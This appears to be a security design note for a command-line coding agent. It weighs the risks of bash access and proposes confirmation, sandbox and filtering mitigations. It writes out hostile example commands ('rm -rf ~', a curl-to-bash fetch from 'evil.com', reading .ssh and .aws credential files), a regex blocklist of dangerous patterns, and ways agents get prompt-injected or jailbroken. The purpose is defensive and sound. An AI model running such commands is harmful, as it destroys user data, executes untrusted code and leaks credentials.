# Security Considerations

## The Risk

**Giving an agent bash access is inherently dangerous.**

The agent can run ANY command the user can run:
- `rm -rf ~` — delete home directory
- `curl evil.com/malware.sh | bash` — execute remote code
- Access `.ssh/`, `.aws/`, `.env` files with credentials
- Exfiltrate data via network

This is not hypothetical. An LLM could be:
1. **Prompted maliciously** — adversarial input in GitHub issue or file contents
2. **Hallucinate dangerously** — misunderstand task and run destructive command
3. **Be jailbroken** — via prompt injection in code comments

## Current Mitigations

### 1. Confirmation Mode (default)

The interactive agent runs in `mode: confirm` by default:
```yaml
agent:
  mode: confirm  # User must approve each command
```

User sees each command before execution and can reject dangerous ones.

**Problem**: Tedious for long sessions, user may rubber-stamp.

### 2. Docker/Podman Containers (for benchmarks)

SWE-bench runs use isolated containers:
```yaml
environment:
  environment_class: docker
```

Container is ephemeral, destroyed after task. Host filesystem untouched.

**Problem**: Not currently used for interactive mode.

## Proposed Security Levels

| Level | Description | Use Case |
|-------|-------------|----------|
| **sandbox** (safest) | All commands run in container, no host access | Default for new users |
| **confirm** (current default) | User approves each command | Experienced users |
| **project** | Commands restricted to project directory | Middle ground |
| **yolo** | No confirmation, direct execution | Trusted tasks only |

## Implementation Options

### Option A: Mandatory Sandbox for New Users

First run defaults to `--sandbox`:
```bash
$ mini
⚠️  Running in SANDBOX mode for safety.
   Use --local to run directly on host (not recommended).
```

### Option B: Command Filtering

Blocklist dangerous patterns:
```python
DANGEROUS_PATTERNS = [
    r"rm\s+-rf?\s+[~/]",      # rm on home or root
    r">\s*/dev/sd",            # write to disk device
    r"chmod\s+777",            # world-writable
    r"curl.*\|\s*bash",        # pipe to shell
]
```

**Problem**: Easy to bypass, gives false sense of security.

### Option C: Filesystem Restrictions

Use AppArmor/SELinux or bubblewrap:
```bash
bwrap --ro-bind / / --bind ./project ./project --unshare-net ...
```

Read-only everywhere except project directory, no network.

## Recommendation

1. **Short term**: Add prominent warning in README/docs
2. **Medium term**: Implement `--sandbox` as default
3. **Long term**: Project-scoped restrictions without full container

## ⚠️ Current Warning (add to README)

```markdown
> **Security Warning**: swesh executes commands with your user privileges.
> In `confirm` mode, always review commands before approving.
> For untrusted tasks, use `--sandbox` mode (when available).
```
